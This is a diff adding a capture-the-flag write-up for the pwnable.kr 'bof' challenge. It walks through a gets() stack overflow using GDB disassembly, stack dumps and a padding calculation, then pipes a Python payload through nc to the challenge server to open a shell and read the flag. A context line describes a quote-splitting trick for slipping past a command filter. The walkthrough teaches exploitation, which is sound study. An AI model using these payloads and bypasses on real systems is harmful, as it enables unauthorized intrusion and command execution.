@@ -327,6 +327,134 @@ Broken!
 b1NaRy_S34rch1nG_1s_3asy_p3asy
 ```
 
+### bof
+Something new, instead of being told to **just** connect to a server, we're
+given a binary and the source code and most likely have to do some kind of
+reverse engineering to solve whatever problem awaits us at the server.
+
+So, let's take a look at the source first.
+
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+```
+
+So, what we need to do is overflow the 32 character array so that the key no
+longer says `0xdeadbeef` but `0xcafebabe` instead. So how the hell do we do that?
+
+First, lets just try running the program and giving it some standard input. We
+know the input will have to be at least greater than 32 characters.
+
+Lets view this in GDB while we're running it so we can see what the stack looks
+like. First lets disassemble the func function and set a breakpoint right
+before our comparison at address `0x56555654`.
+
+```none
+(gdb) disas func
+Dump of assembler code for function func:
+   0x5655562c <+0>:	push   %ebp
+   0x5655562d <+1>:	mov    %esp,%ebp
+   0x5655562f <+3>:	sub    $0x48,%esp
+   0x56555632 <+6>:	mov    %gs:0x14,%eax
+   0x56555638 <+12>:	mov    %eax,-0xc(%ebp)
+   0x5655563b <+15>:	xor    %eax,%eax
+   0x5655563d <+17>:	movl   $0x5655578c,(%esp)
+   0x56555644 <+24>:	call   0xf7e45b40 <puts>
+   0x56555649 <+29>:	lea    -0x2c(%ebp),%eax
+   0x5655564c <+32>:	mov    %eax,(%esp)
+   0x5655564f <+35>:	call   0xf7e452b0 <gets>
+=> 0x56555654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
+   0x5655565b <+47>:	jne    0x5655566b <func+63>
+   0x5655565d <+49>:	movl   $0x5655579b,(%esp)
+   0x56555664 <+56>:	call   0xf7e1b200 <system>
+   0x56555669 <+61>:	jmp    0x56555677 <func+75>
+   0x5655566b <+63>:	movl   $0x565557a3,(%esp)
+   0x56555672 <+70>:	call   0xf7e45b40 <puts>
+   0x56555677 <+75>:	mov    -0xc(%ebp),%eax
+   0x5655567a <+78>:	xor    %gs:0x14,%eax
+   0x56555681 <+85>:	je     0x56555688 <func+92>
+   0x56555683 <+87>:	call   0xf7ee7b60 <__stack_chk_fail>
+   0x56555688 <+92>:	leave  
+   0x56555689 <+93>:	ret    
+End of assembler dump.
+```
+
+Okay, lets run the program with some standard input and see what it looks like.
+```
+(gdb) run
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/bell/pwnable/bof 
+overflow me : 
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+
+Breakpoint 1, 0x56555654 in func ()
+(gdb) x/25x $sp
+0xffffd0a0:	0xffffd0bc	0x00000000	0x00000000	0x9e8df500
+0xffffd0b0:	0x00000009	0xffffd35d	0xf7e0e4a9	0x41414141
+0xffffd0c0:	0x42424242	0x43434343	0x44444444	0x45454545
+0xffffd0d0:	0x46464646	0x47474747	0x48484848	0x9e8df500
+0xffffd0e0:	0x00000000	0xf7e0e5db	0xffffd108	0x5655569f
+0xffffd0f0:	0xdeadbeef	0x00000000	0x565556b9	0x00000000
+0xffffd100:	0xf7fb6000
+```
+
+We see our input starting at address `0xffffd0bd` with our `A`s in hex (`0x41414141`).
+Our input ends at `0xffffd0e0` where we have some null bytes, and then the value
+we want to change (`0xdeadbeef`) is a few bytes away. So theoretically we should 
+just have to add 13 words of padding (52 characters) and then `0xcafebabe`.
+
+The easiest way to do this is with python. We first print A 52 times for our
+padding, then append `0xcafebabe` in hex. Take in mind that this is likely a 
+little endien system, so we have to reverse the order of the bytes.
+
+```sh
+$ python -c "print 'A'*52 + '\xbe\xba\xfe\xca'"
+```
+
+Then, we send this on to the server.
+
+```sh
+$ python -c "print 'A'*52 + '\xbe\xba\xfe\xca'" | nc pwnable.kr 9000
+ls
+cat flag
+```
+
+Hmm... it seems were connected and maybe running the commands, but getting no
+response back? It appears STDIN is going nowhere, so lets have cat print
+out everything going to STDIN.
+
+```sh
+$ (python -c "print 'A'*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+cat flag
+daddy, I just pwned a buFFer :)
+```
+
+Tada!
+
 ### cmd1
 
 ```c
@@ -350,7 +478,7 @@ int main(int argc, char* argv[], char** envp){
 	return 0;
 }
 ```
-
+ 
 We can't rely on path, so we have to specify exact path to executables. In this case we want /bin/cat.
 We can't use "flag" directly, because it will cause our filter() function to return >1. 
 We can use lots of quotes to bypass the filter. Such as: ```"f""l""a""g"```.
